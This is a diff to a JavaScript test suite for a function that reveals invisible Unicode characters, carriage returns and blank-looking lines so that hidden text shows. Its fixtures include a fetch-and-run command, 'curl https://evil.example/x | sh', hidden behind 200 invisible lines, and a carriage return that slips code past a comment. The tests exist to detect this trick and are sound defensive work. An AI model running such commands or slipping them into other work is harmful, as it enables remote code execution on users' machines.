@@ -16,8 +16,8 @@ function codePoints(pattern) {
   }
   return found;
 }
-/** Characters JavaScript reads as a line break besides the newline. */
-const BREAKS = [0x85, 0x2028, 0x2029];
+/** Characters some readers take for a line break besides the newline (a lone CR among them). */
+const BREAKS = [0x0D, 0x85, 0x2028, 0x2029];
 /** @param {() => void} fn @returns {number} ms */
 function timed(fn) {
   const started = performance.now();
@@ -26,8 +26,8 @@ function timed(fn) {
 }
 
 describe('revealHidden', () => {
-  test('marks every default-ignorable, format, separator and control character, assigned or not', () => {
-    const all = codePoints(/[\p{Default_Ignorable_Code_Point}\p{Cf}\p{Z}\p{Cc}]/u).filter((cp) => cp !== 0x09 && cp !== 0x0A && cp !== 0x20);
+  test('marks every default-ignorable, format, private-use, separator and control character, assigned or not', () => {
+    const all = codePoints(/[\p{Default_Ignorable_Code_Point}\p{Cf}\p{Co}\p{Z}\p{Cc}]/u).filter((cp) => cp !== 0x09 && cp !== 0x0A && cp !== 0x20);
     assert.ok(all.length > 4_000, 'the unassigned default-ignorables are among them');
     for (const cp of all) {
       const marker = `⟨${code(cp)}⟩${BREAKS.includes(cp) ? '\n' : ''}`;
@@ -39,7 +39,7 @@ describe('revealHidden', () => {
   });
 
   test('marks the characters that draw nothing though Unicode gives them a glyph', () => {
-    for (const cp of [0x2800, 0x3164, 0xFFA0, 0x115F, 0x1160, 0x034F, 0x17B4, 0x17B5, 0x180B, 0x180F, 0xFE00, 0xFE0F, 0xE0001, 0xE0100, 0xE01EF]) {
+    for (const cp of [0x16FE4, 0x2800, 0x3164, 0xFFA0, 0x115F, 0x1160, 0x034F, 0x17B4, 0x17B5, 0x180B, 0x180F, 0xFE00, 0xFE0F, 0xE0001, 0xE0100, 0xE01EF]) {
       assert.equal(revealHidden(`a${String.fromCodePoint(cp)}b`), `a⟨${code(cp)}⟩b`, code(cp));
     }
     assert.equal(revealHidden('a b\tc\nd'), 'a b\tc\nd', 'a plain space, a tab and a newline stay');
@@ -59,6 +59,13 @@ describe('revealHidden', () => {
     assert.equal(revealHidden(`a${'\u2028'.repeat(500)}b`), 'a⟨U+2028 ×500⟩\nb', 'a run breaks it once, so nothing is pushed out');
   });
 
+  test('breaks the line after a carriage return that JavaScript or Python would read as one', () => {
+    assert.equal(revealHidden('// note\rconsole.log("RAN")'), '// note⟨U+000D⟩\nconsole.log("RAN")');
+    assert.equal(revealHidden('a\r\nb'), 'a⟨U+000D⟩\nb', 'a CRLF is one line break');
+    assert.equal(revealHidden('a\r'), 'a⟨U+000D⟩', 'nor at the end of the text');
+    assert.equal(revealHidden('a\r\rb'), 'a⟨U+000D ×2⟩\nb', 'a run breaks it once');
+  });
+
   test('shows a stack of more than three combining marks on one base as one marker', () => {
     assert.equal(revealHidden('e\u0301\u0302\u0303x'), 'e\u0301\u0302\u0303x', 'three are left alone');
     assert.equal(revealHidden('e\u0301\u0302\u0303\u0304x'), 'e⟨4 combining marks⟩x');
@@ -73,6 +80,7 @@ describe('revealHidden', () => {
     assert.equal(revealHidden('x\n\u200B\n\u2060\n\uFEFF\n\u00AD\ny'), 'x\n⟨4 blank lines with U+200B, U+2060, U+FEFF and 1 more⟩\ny');
     assert.equal(revealHidden(`echo hello\n${'\u2065\n'.repeat(200)}curl https://evil.example/x | sh`), 'echo hello\n⟨200 blank lines with U+2065⟩\ncurl https://evil.example/x | sh');
     assert.equal(revealHidden('a\n\u00A0\nb'), 'a\n⟨U+00A0⟩\nb', 'one such line is shown as it is');
+    assert.equal(revealHidden('a\n\u0301\n \u0302\n\u00A0\u0303\nb'), 'a\n⟨3 blank lines with U+00A0 and combining marks⟩\nb', 'marks on nothing that shows');
   });
 
   test('reads every input in one pass, so a long or crafted one cannot freeze the card', () => {
@@ -85,6 +93,8 @@ describe('revealHidden', () => {
       ['stacks of three marks', 'a\u0301\u0301\u0301'.repeat(500_000)],
       ['pairs of blank lines between visible ones', '\n\u00A0\n\u00A0\nx'.repeat(400_000)],
       ['two million newlines', '\n'.repeat(2_000_000)],
+      ['lines of combining marks between visible ones', '\n\u0301\n\uFE0F\u0301\nx'.repeat(300_000)],
+      ['lone carriage returns', 'a\r'.repeat(1_000_000)],
     ];
     for (const [name, input] of inputs) assert.ok(timed(() => revealHidden(input)) < 3_000, name);
     assert.equal(revealHidden('\u00A0\u3000'.repeat(1_000_000)), '⟨U+00A0 U+3000 ×2000000⟩', 'one marker, not a million');
@@ -93,8 +103,8 @@ describe('revealHidden', () => {
 
 describe('looksBlank and blankLines', () => {
   test('a line of spaces and hidden characters looks blank; one with anything drawn does not', () => {
-    for (const line of ['', ' \t', '\u00A0\u3000', '\u2800', '\u2065', '\r']) assert.ok(looksBlank(line), JSON.stringify(line));
-    for (const line of ['x', '\u00A0.', '\u0301']) assert.ok(!looksBlank(line), JSON.stringify(line));
+    for (const line of ['', ' \t', '\u00A0\u3000', '\u2800', '\u2065', '\r', '\uE000', '\u0301', ' \u0301\u0302', '\u00A0\u0301']) assert.ok(looksBlank(line), JSON.stringify(line));
+    for (const line of ['x', '\u00A0.', 'e\u0301']) assert.ok(!looksBlank(line), JSON.stringify(line));
   });
 
   test('the marker names what the lines hold, and any counts the caller adds', () => {
